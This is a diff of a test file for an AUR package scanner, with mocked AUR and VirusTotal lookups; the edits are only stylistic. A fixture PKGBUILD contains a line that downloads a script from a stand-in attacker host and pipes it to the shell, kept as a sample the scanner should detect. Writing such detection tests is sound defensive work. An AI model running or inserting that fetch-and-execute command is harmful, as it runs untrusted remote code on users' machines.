@@ -25,7 +25,7 @@ const PKGBUILD_WITHOUT_URLS = [
 const PKGBUILD_WITH_INDICATORS = [
   'pkgname=evilpkg',
   'source=("https://evil.example/payload.sh")',
-  'sha256sums=(' + 'a'.repeat(64) + ')',
+  `sha256sums=(${'a'.repeat(64)})`,
   'build() {',
   '  curl -s https://evil.example/payload.sh | sh',
   '}',
@@ -259,9 +259,7 @@ describe('AUR package scan (e2e, real PostgreSQL, mocked AUR and VirusTotal upst
       const realFetch = globalThis.fetch;
       vi.stubGlobal('fetch', async (input: RequestInfo | URL, init?: RequestInit) => {
         const url = String(input);
-        if (url.includes('rpc/v5/search')) {
-          return jsonResponse({ results: [{ Name: 'paru' }, { Name: 'paru-git' }] });
-        }
+        if (url.includes('rpc/v5/search')) return jsonResponse({ results: [{ Name: 'paru' }, { Name: 'paru-git' }] });
         return realFetch(input, init);
       });
 
